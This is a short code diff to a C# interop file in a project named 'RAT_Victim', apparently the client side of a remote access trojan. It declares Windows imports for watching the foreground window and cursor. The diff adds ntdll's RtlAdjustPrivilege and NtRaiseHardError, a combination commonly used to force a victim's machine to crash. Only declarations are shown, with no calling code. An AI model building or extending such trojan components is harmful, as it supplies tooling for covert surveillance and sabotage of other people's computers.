@@ -1,4 +1,5 @@
-﻿using System.Drawing;
+﻿using System;
+using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
@@ -9,6 +10,7 @@ namespace RAT_Victim
     {
         private const string User = "user32";
         private const string Kernel = "kernel32";
+        private const string Nt = "ntdll";
 
         [DllImport(User)]
         public static extern uint GetForegroundWindow();
@@ -36,5 +38,12 @@ namespace RAT_Victim
 
         [DllImport(User)]
         public static extern bool GetCursorPos(out Point lpPoint);
+
+        [DllImport(Nt)]
+        public static extern uint RtlAdjustPrivilege(int privilege, bool bEnablePrivilege, bool isThreadPrivilege, out bool previousValue);
+
+        [DllImport(Nt)]
+        public static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);
+
     }
 }
